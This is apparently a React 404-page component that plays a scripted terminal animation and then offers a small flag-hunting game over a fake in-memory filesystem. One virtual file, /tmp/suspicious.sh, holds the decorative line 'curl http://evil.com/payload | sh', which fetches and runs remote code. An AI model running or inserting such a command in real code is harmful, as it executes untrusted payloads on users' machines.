import React, { useState, useEffect, useCallback, useRef } from "react";
import { Link } from "react-router-dom";
import { useTranslation } from "react-i18next";
import { useTheme } from "../hooks/useTheme";
import Navigation from "../components/Navigation";

const terminalLines = [
  { cmd: "curl -I /this-page", delay: 0 },
  { cmd: "HTTP/1.1 404 Not Found", delay: 800, isOutput: true },
  { cmd: "sudo find / -name 'page' --recursive", delay: 1800 },
  { cmd: "find: Permission denied", delay: 2600, isOutput: true },
  { cmd: "nmap -sV target", delay: 3600 },
  { cmd: "0 open ports — nothing to see here.", delay: 4400, isOutput: true },
  { cmd: "help", delay: 5400 },
  { cmd: "> Can you find the flag? Type help to see available commands.", delay: 5900, isOutput: true },
];

// Virtual filesystem
const fileSystem = {
  "/": {
    type: "dir",
    children: ["home", "var", "etc", "root", "tmp"],
    meta: { perms: "drwxr-xr-x", links: 5, size: 160 },
  },
  "/home": {
    type: "dir",
    children: ["user"],
    meta: { perms: "drwxr-xr-x", links: 3, size: 96 },
  },
  "/home/user": {
    type: "dir",
    children: ["readme.txt"],
    meta: { perms: "drwxr-xr-x", links: 3, size: 96 },
  },
  "/home/user/readme.txt": {
    type: "file",
    content: "Nothing interesting here...",
    meta: { perms: "-rw-r--r--", links: 1, size: 26 },
  },
  "/var": {
    type: "dir",
    children: ["log"],
    meta: { perms: "drwxr-xr-x", links: 3, size: 96 },
  },
  "/var/log": {
    type: "dir",
    children: ["auth.log"],
    meta: { perms: "drwxr-xr-x", links: 2, size: 64 },
  },
  "/var/log/auth.log": {
    type: "file",
    content:
      "Failed login attempts detected from 192.168.1.42\nBrute-force pattern identified. Account locked.",
    meta: { perms: "-rw-r-----", links: 1, size: 4096 },
  },
  "/etc": {
    type: "dir",
    children: ["passwd"],
    meta: { perms: "drwxr-xr-x", links: 2, size: 64 },
  },
  "/etc/passwd": {
    type: "file",
    content: "root:x:0:0:root:/root:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
    meta: { perms: "-rw-r--r--", links: 1, size: 1724 },
  },
  "/root": {
    type: "dir",
    children: [".flag.txt"],
    meta: { perms: "drwx------", links: 2, size: 64 },
  },
  "/root/.flag.txt": {
    type: "file",
    content: "FLAG{404_h4ck3r_f0und_m3}",
    isFlag: true,
    meta: { perms: "-rw-------", links: 1, size: 26 },
  },
  "/tmp": {
    type: "dir",
    children: ["suspicious.sh"],
    meta: { perms: "drwxrwxrwt", links: 2, size: 64 },
  },
  "/tmp/suspicious.sh": {
    type: "file",
    content: "#!/bin/bash\n# nice try, but the flag isn't here...\ncurl http://evil.com/payload | sh",
    meta: { perms: "-rwxr-xr-x", links: 1, size: 512 },
  },
};

function formatSize(size) {
  if (size >= 1024) return (size / 1024).toFixed(1).replace(/\.0$/, "") + "K";
  return String(size);
}

function resolvePath(cwd, target) {
  if (!target) return cwd;
  let parts;
  if (target.startsWith("/")) {
    parts = target.split("/").filter(Boolean);
  } else {
    parts = [...cwd.split("/").filter(Boolean), ...target.split("/").filter(Boolean)];
  }
  const resolved = [];
  for (const p of parts) {
    if (p === "..") resolved.pop();
    else if (p !== ".") resolved.push(p);
  }
  return "/" + resolved.join("/");
}

function formatPrompt(cwd) {
  const display = cwd === "/" ? "/" : "~" + cwd;
  return { cwd: display };
}

function executeCommand(input, cwd) {
  const trimmed = input.trim();
  if (!trimmed) return { output: null, newCwd: cwd, isFlag: false };

  const parts = trimmed.split(/\s+/);
  const cmd = parts[0];

  if (cmd === "cd") {
    const target = parts[1] || "/";
    const resolved = resolvePath(cwd, target);
    const node = fileSystem[resolved];
    if (!node || node.type !== "dir") {
      return { output: `bash: cd: ${parts[1]}: No such file or directory`, newCwd: cwd, isFlag: false };
    }
    return { output: null, newCwd: resolved, isFlag: false };
  }

  if (cmd === "ls") {
    const flags = parts.filter((p) => p.startsWith("-")).join("");
    const showHidden = flags.includes("a");
    const longFormat = flags.includes("l");
    const target = parts.find((p) => p !== "ls" && !p.startsWith("-"));
    const resolved = target ? resolvePath(cwd, target) : cwd;
    const node = fileSystem[resolved];
    if (!node || node.type !== "dir") {
      return { output: `ls: cannot access '${target}': No such file or directory`, newCwd: cwd, isFlag: false };
    }
    const children = showHidden
      ? node.children
      : node.children.filter((c) => !c.startsWith("."));
    if (children.length === 0) return { output: null, newCwd: cwd, isFlag: false };
    const formatted = children.map((c) => {
      const childPath = resolved === "/" ? "/" + c : resolved + "/" + c;
      const childNode = fileSystem[childPath];
      const isDir = childNode && childNode.type === "dir";
      const meta = childNode && childNode.meta;
      return { name: c, isDir, meta };
    });
    if (longFormat) {
      return { output: formatted, newCwd: cwd, isFlag: false, isDetailedList: true };
    }
    return { output: formatted, newCwd: cwd, isFlag: false, isList: true };
  }

  if (cmd === "cat") {
    const target = parts[1];
    if (!target) return { output: "cat: missing operand", newCwd: cwd, isFlag: false };
    const resolved = resolvePath(cwd, target);
    const node = fileSystem[resolved];
    if (!node || node.type !== "file") {
      return { output: `cat: ${target}: No such file or directory`, newCwd: cwd, isFlag: false };
    }
    return { output: node.content, newCwd: cwd, isFlag: !!node.isFlag };
  }

  if (cmd === "help") {
    return {
      output: "Available commands: ls, ls -la, cd <dir>, cat <file>, clear, help",
      newCwd: cwd,
      isFlag: false,
    };
  }

  if (cmd === "clear") {
    return { output: null, newCwd: cwd, isFlag: false, isClear: true };
  }

  if (cmd === "pwd") {
    return { output: cwd, newCwd: cwd, isFlag: false };
  }

  return { output: `bash: ${cmd}: command not found`, newCwd: cwd, isFlag: false };
}

const PromptSpan = ({ cwd }) => {
  const { cwd: display } = formatPrompt(cwd);
  return (
    <>
      <span className="t-prompt">root@kali</span>
      <span className="t-sep">:</span>
      <span className="t-path">{display}</span>
      <span className="t-dollar"> $ </span>
    </>
  );
};

const NotFound = () => {
  const { isDarkTheme } = useTheme();
  const { t } = useTranslation();
  const [visibleLines, setVisibleLines] = useState(0);
  const [terminalState, setTerminalState] = useState("open");
  const [animationDone, setAnimationDone] = useState(false);
  const [history, setHistory] = useState([]);
  const [cwd, setCwd] = useState("/");
  const [inputValue, setInputValue] = useState("");
  const bodyRef = useRef(null);
  const inputRef = useRef(null);

  // Animation phase
  useEffect(() => {
    if (terminalState !== "open") return;
    if (visibleLines >= terminalLines.length) {
      const timer = setTimeout(() => setAnimationDone(true), 600);
      return () => clearTimeout(timer);
    }
    const timer = setTimeout(
      () => setVisibleLines((v) => v + 1),
      terminalLines[visibleLines].delay -
        (visibleLines > 0 ? terminalLines[visibleLines - 1].delay : 0)
    );
    return () => clearTimeout(timer);
  }, [visibleLines, terminalState]);

  // Auto-scroll
  useEffect(() => {
    if (bodyRef.current) {
      bodyRef.current.scrollTop = bodyRef.current.scrollHeight;
    }
  }, [history, visibleLines, animationDone]);

  // Focus input when animation done
  useEffect(() => {
    if (animationDone && inputRef.current) {
      inputRef.current.focus();
    }
  }, [animationDone]);

  const handleSubmit = (e) => {
    e.preventDefault();
    const cmd = inputValue;
    setInputValue("");

    const result = executeCommand(cmd, cwd);

    if (result.isClear) {
      setHistory([]);
      setCwd(result.newCwd);
      return;
    }

    const entry = {
      cmd,
      cwd,
      output: result.output,
      isFlag: result.isFlag,
      isList: result.isList,
      isDetailedList: result.isDetailedList,
    };

    setHistory((prev) => [...prev, entry]);
    setCwd(result.newCwd);
  };

  const handleClose = () => {
    setTerminalState("closing");
    setTimeout(() => setTerminalState("closed"), 600);
  };

  const handleReopen = useCallback(() => {
    setVisibleLines(0);
    setAnimationDone(false);
    setHistory([]);
    setCwd("/");
    setInputValue("");
    setTerminalState("open");
  }, []);

  const handleBodyClick = () => {
    if (animationDone && inputRef.current) {
      inputRef.current.focus();
    }
  };

  return (
    <div className={isDarkTheme ? "dark-mode" : ""}>
      <Navigation variant="project" />
      <div className="not-found">
        <div className="not-found-content">
          <h1 className="not-found-code">
            4<span className="Highlight">0</span>4
          </h1>
          <p className="not-found-message">{t("notFoundMessage")}</p>

          <div className={`terminal-wrapper ${terminalState === "closing" || terminalState === "closed" ? "terminal-wrapper--closed" : ""}`}>
            <div className="not-found-terminal">
              <div className="terminal-header">
                <div className="terminal-dots">
                  <button className="terminal-dot dot-red" onClick={handleClose} aria-label="Close terminal">
                    <svg className="dot-icon" viewBox="0 0 12 12"><path d="M3.5 3.5l5 5M8.5 3.5l-5 5" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>
                  </button>
                  <span className="terminal-dot dot-yellow">
                    <svg className="dot-icon" viewBox="0 0 12 12"><path d="M2.5 6h7" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>
                  </span>
                  <span className="terminal-dot dot-green">
                    <svg className="dot-icon" viewBox="0 0 12 12"><path d="M3 9V3h6" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" fill="none"/><path d="M9 3L3 9" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>
                  </span>
                </div>
              </div>
              <div className="terminal-body" ref={bodyRef} onClick={handleBodyClick}>
                <pre className="terminal-pre"><code>
                  {/* Phase 1: Scripted animation */}
                  {terminalLines.map((line, i) => (
                    <span key={i} className={i < visibleLines ? "notfound-line" : "notfound-line notfound-line--hidden"}>
                      {line.isOutput ? (
                        <span className="t-output-header">{`  ${line.cmd}`}</span>
                      ) : (
                        <>
                          <span className="t-prompt">root@kali</span>
                          <span className="t-sep">:</span>
                          <span className="t-path">~</span>
                          <span className="t-dollar"> $ </span>
                          <span className="t-cmd">{line.cmd}</span>
                        </>
                      )}
                      {"\n"}
                    </span>
                  ))}

                  {/* Phase 2: Interactive history */}
                  {history.map((entry, i) => (
                    <span key={"h" + i} className="notfound-line">
                      <PromptSpan cwd={entry.cwd} />
                      <span className="t-cmd">{entry.cmd}</span>
                      {"\n"}
                      {entry.output !== null && (
                        entry.isDetailedList ? (
                          <span className="t-output-header">
                            {entry.output.map((item, j) => (
                              <span key={j}>
                                {"  "}{item.meta.perms} {String(item.meta.links).padStart(2)} julienlarzul staff {formatSize(item.meta.size).padStart(5)}  16 oct. 10:42 <span className={item.isDir ? "t-ls-dir" : "t-ls-file"}>{item.name}</span>{"\n"}
                              </span>
                            ))}
                          </span>
                        ) : entry.isList ? (
                          <span className="t-output-header">
                            {"  "}{entry.output.map((item, j) => (
                              <span key={j}>
                                <span className={item.isDir ? "t-ls-dir" : "t-ls-file"}>{item.name}</span>
                                {j < entry.output.length - 1 ? "  " : ""}
                              </span>
                            ))}
                            {"\n"}
                          </span>
                        ) : (
                          <span className={entry.isFlag ? "t-flag" : "t-output-header"}>
                            {entry.output.split("\n").map((line, j) => (
                              <span key={j}>{"  "}{line}{"\n"}</span>
                            ))}
                          </span>
                        )
                      )}
                      {entry.isFlag && (
                        <span className="t-flag t-flag-success">
                          {"\n"}  {"🚩 Congratulations! You found the flag!"}{"\n"}
                        </span>
                      )}
                    </span>
                  ))}

                  {/* Active prompt / cursor */}
                  {animationDone ? (
                    <span className="notfound-line notfound-input-line">
                      <PromptSpan cwd={cwd} />
                      <form onSubmit={handleSubmit} className="terminal-form">
                        <input
                          ref={inputRef}
                          type="text"
                          className="terminal-input"
                          value={inputValue}
                          onChange={(e) => setInputValue(e.target.value)}
                          spellCheck={false}
                          autoComplete="off"
                          autoCapitalize="off"
                        />
                      </form>
                    </span>
                  ) : (
                    <span className={visibleLines >= terminalLines.length ? "notfound-line" : "notfound-line notfound-line--hidden"}>
                      <span className="t-prompt">root@kali</span>
                      <span className="t-sep">:</span>
                      <span className="t-path">~</span>
                      <span className="t-dollar"> $ </span>
                      <span className="t-cursor"></span>
                    </span>
                  )}
                </code></pre>
              </div>
            </div>
          </div>

          <div className={`reopen-wrapper ${terminalState === "closed" ? "reopen-wrapper--visible" : ""}`}>
            <button className="terminal-reopen" onClick={handleReopen}>
              <span className="terminal-reopen__icon">&gt;_</span>
              {t("notFoundReopen")}
            </button>
          </div>

          <Link to="/" className="not-found-link">
            {t("notFoundLink")}
          </Link>
        </div>
      </div>
    </div>
  );
};

export default NotFound;
